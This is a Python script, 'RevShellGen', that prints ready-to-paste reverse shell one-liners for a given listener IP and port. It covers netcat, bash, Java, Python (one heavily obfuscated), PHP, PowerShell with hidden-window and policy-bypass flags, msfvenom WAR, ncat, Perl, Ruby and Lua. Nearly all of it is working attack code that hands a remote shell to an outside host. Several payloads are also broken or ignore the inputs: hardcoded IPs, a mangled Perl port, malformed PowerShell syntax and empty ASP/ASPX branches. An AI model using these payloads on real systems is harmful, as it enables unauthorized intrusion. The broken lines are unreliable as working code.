import argparse
import sys

parser = argparse.ArgumentParser(
    prog="RevShellGen", description='A script to create copy & paste command to create Reverse Shell for selected Language')
parser.add_argument('IP', metavar='IP', type=str,
                    help='Listening IP Address')
parser.add_argument('LPORT', metavar='LPORT', type=str,
                    help='Listening PORT')
parser.add_argument('--generate', metavar="SHELL", nargs="+", action='append',
                    help='Get Reverse Shell for specified arguments - [nc, bash, python, python3, java, php, powershell, Ncat, asp, aspx, perl, ruby, lua, awk, C, NodeJs, OpenSSL, Socat, war')

args = parser.parse_args()
# print(args)
# if "-h" or "--help" in args:
#     parser.print_help()
#     sys.exit(0)

generate = args.generate
ip = args.IP
lport = args.LPORT

print(f'\nGenerating reverse shell commands for {ip}:{lport} ...')
print('\n------------------------------------------------------------------------')

for element in generate[0]:
    if element == "nc":
        print("\n### Netcat Reverse Shell ###\n")
        print(
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {lport} >/tmp/f")
        print("\n------------------------------------------------------------------------")

    if element == "bash":
        print("\n### Bash Reverse Shell ###\n")
        print(f'bash -i >& /dev/tcp/{ip}/{lport} 0>&1')
        print("\n------------------------------------------------------------------------")

    if element == "java":
        print("\n### Java Reverse Shell ###\n")
        print(
            f'r=Runtime.getRuntime()\r\np=r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/{ip}/{lport};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])\r\np.waitFor()')
        print("\n------------------------------------------------------------------------")

    if element == "python":
        print("\n### Python Reverse Shell ###\n For Linux:\n")

        print(
            f'IPv4:\n python -c \'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(("{ip}", {lport}));os.dup2(s.fileno(), 0);os.dup2(s.fileno(), 1);os.dup2(s.fileno(), 2);import pty;pty.spawn("/bin/bash")\'')
        print(
            f'IPv6:\n python -c \'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("{ip}", {lport})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2);p=subprocess.call(["/bin/sh", "-i"])\'')

        print("\n For Windows:\n")

        print("C:\Python27\python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('"+ip+"', "+lport+")), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"")

        print("\n------------------------------------------------------------------------")

    if element == "php":
        print("\n### PHP Reverse Shell ###\n")

        print("Method 1:")
        print(f'php -r \'$sock=fsockopen("192.168.119.222", 1234); exec("/bin/sh -i <&3 >&3 2>&3")\'')

        print("\nMethod 2:")
        print(f'php -r \'$sock=fsockopen("10.0.0.1", 4242);$proc=proc_open("/bin/sh -i", array(0= >$sock, 1= >$sock, 2= >$sock), $pipes)\'')

        print("\n------------------------------------------------------------------------")

    if element == "powershell":
        print("\n### PowerShell Reverse Shell ###\n")

        print("Method 1:")
        print('powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("'+ip+'", '+lport +
              ');$stream= $client.GetStream()[byte[]]$bytes=0..65535 | %{0}while(($i = $stream.Read($bytes, 0, $bytes.Length)) - ne 0){; $data = (New-Object - TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2 > &1 | Out-String); $sendback2  = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]: : ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush()}; $client.Close()')

        print("\nMethod 2:")
        print("powershell -nop -c \"$client=New-Object System.Net.Sockets.TCPClient("+ip+", "+lport +
              "); $stream = $client.GetStream();[byte[]]$bytes=0..65535 | %{0} while(($i = $stream.Read($bytes, 0, $bytes.Length)) - ne 0){; $data = (New-Object - TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2 > &1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]: : ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush()}; $client.Close()\"")

        print("\n------------------------------------------------------------------------")

    if element == "war":
        print("\n### WAR Reverse Shell ###\n")

        print(
            f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={lport} -f war > reverse.war\nstrings reverse.war | grep jsp # in order to get the name of the file')
        print("\n------------------------------------------------------------------------")

    if element == "Ncat":
        print("\n### Ncat Reverse Shell ###\n")

        print(f"ncat {ip} {lport} -e /bin/bash")
        print("Note: can add --udp if we want to use UDP connection")
        print("\n------------------------------------------------------------------------")

    if element == "asp":
        print("\n### ASP Reverse Shell ###\n")
        # TODO Need to find the ASP Reverse Shell to put here to print out

    if element == "aspx":
        print("\n### ASPX Reverse Shell ###\n")
        # TODO Need to find the ASPX Reverse Shell to put here to print out

    if element == "perl":
        print("\n### Perl Reverse Shell ###\n")
        print("For Linux:")
        print('perl -e \'use Socket;$i="'+ip+'";$p='+lport+';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN," > &S");open(STDOUT," > &S");open(STDERR," > &S");exec("/bin/sh - i");};\'')
        
        print("\nFor Windows:")
        print('perl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,"'+ip+':'+lport+'4242"); STDIN -> fdopen($c, r); $~ -> fdopen($c, w); system$_ while <> ; \'')
        print("\n------------------------------------------------------------------------")
    
    if element == "ruby":
        print("\n### Ruby Reverse Shell ###\n")

        print("For Linux:")
        print(f'ruby -rsocket -e \'f=TCPSocket.open("{ip}",{lport}).to_i;exec sprintf("/bin/sh - i < & % d > & % d 2 > & % d", f, f, f)\'')

        print("\nFor Windows:")
        print('ruby -rsocket -e \'c=TCPSocket.new("'+ip+'","'+lport+'");while(cmd=c.gets);IO.popen(cmd,"r"){ | io|c.print io.read}end\'')

        print("\n------------------------------------------------------------------------")

    if element == "lua":
        print("\n### Lua Reverse Shell ###\n")
        
        print("For Linux:")
        print(f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{lport}');os.execute('/bin/sh - i <&3 >&3 2>&3'); \"")

        print("\nFor Windows:")
        print('lua5.1 -e \'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp: close()\'')

        print("\n------------------------------------------------------------------------")

print()
